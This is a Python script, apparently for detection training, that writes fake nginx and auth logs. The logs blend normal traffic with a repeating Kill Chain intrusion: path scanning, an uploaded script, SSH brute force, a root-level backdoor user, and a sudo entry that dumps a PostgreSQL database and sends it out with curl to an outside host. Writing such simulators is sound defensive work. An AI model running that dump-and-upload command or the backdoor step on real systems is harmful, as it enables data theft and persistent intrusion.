"""Simula tres servidores escribiendo logs: tráfico normal + una intrusión
que recorre la Cyber Kill Chain y se repite cada pocos minutos.

  web-01  nginx access.log  (reconocimiento, entrega)
  ssh-01  auth.log          (explotación, instalación)
  db-01   auth.log          (movimiento y acciones sobre objetivos)
"""
import os
import random
import time

BASE = "/var/log/servers"
for h in ("web-01", "ssh-01", "db-01"):
    os.makedirs(f"{BASE}/{h}", exist_ok=True)

ATK_WEB = "45.83.64.12"      # escáner + subida
ATK_SSH = "185.220.101.7"    # fuerza bruta
pid = 3000


def now_nginx():
    return time.strftime("%d/%b/%Y:%H:%M:%S +0000", time.gmtime())


def now_sys():
    return time.strftime("%b %e %H:%M:%S", time.gmtime())


def web(ip, method, path, status, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"):
    with open(f"{BASE}/web-01/access.log", "a") as f:
        f.write(f'{ip} - - [{now_nginx()}] "{method} {path} HTTP/1.1" {status} {random.randint(200, 9000)} "-" "{ua}"\n')


def auth(host, prog, msg):
    global pid
    pid += 1
    with open(f"{BASE}/{host}/auth.log", "a") as f:
        f.write(f"{now_sys()} {host} {prog}[{pid}]: {msg}\n")


def normal():
    ip = f"10.0.{random.randint(1, 3)}.{random.randint(10, 200)}"
    web(ip, "GET", random.choice(["/", "/productos", "/carrito", "/static/app.js", "/api/stock?id=7"]), 200)
    if random.random() < 0.1:
        auth("ssh-01", "sshd", f"Accepted publickey for operador from 10.20.0.15 port {random.randint(40000, 65000)} ssh2: ED25519 SHA256:q1w2e3")
    if random.random() < 0.05:
        auth("db-01", "sudo", "  operador : TTY=pts/0 ; PWD=/home/operador ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql")


def ataque(fase):
    if fase == "reconocimiento":
        for p in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin", "/backup.zip", "/server-status"]:
            web(ATK_WEB, "GET", p, 404, "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)")
    elif fase == "entrega":
        web(ATK_WEB, "POST", "/api/upload?name=actualizacion.sh", 201, "curl/7.88.1")
    elif fase == "explotacion":
        for _ in range(random.randint(12, 20)):
            u = random.choice(["root", "admin", "deploy", "oracle"])
            auth("ssh-01", "sshd", f"Failed password for {u} from {ATK_SSH} port {random.randint(40000, 65000)} ssh2")
        auth("ssh-01", "sshd", f"Accepted password for deploy from {ATK_SSH} port {random.randint(40000, 65000)} ssh2")
    elif fase == "instalacion":
        auth("ssh-01", "useradd", "new user: name=sysupdate, UID=0, GID=0, home=/var/lib/sysupdate, shell=/bin/bash, from=/dev/pts/1")
        auth("ssh-01", "crontab", "(root) REPLACE (root)")
    elif fase == "acciones":
        auth("db-01", "sshd", f"Accepted password for deploy from 10.0.5.21 port {random.randint(40000, 65000)} ssh2")
        auth("db-01", "sudo", "   deploy : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/pg_dumpall -f /tmp/.d.sql")
        auth("db-01", "sudo", "   deploy : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T /tmp/.d.sql http://203.0.113.80:8080/")


FASES = ["reconocimiento", "entrega", "explotacion", "instalacion", "acciones"]
t0 = time.time()
ultimo = {f: 0.0 for f in FASES}
while True:
    for _ in range(random.randint(1, 4)):
        normal()
    # Cada fase se repite cada ~60-90 s, escalonadas: siempre hay actividad en la ventana de 5 min.
    for i, f in enumerate(FASES):
        if time.time() - t0 > i * 8 and time.time() - ultimo[f] > random.randint(60, 90):
            ataque(f)
            ultimo[f] = time.time()
    time.sleep(2)
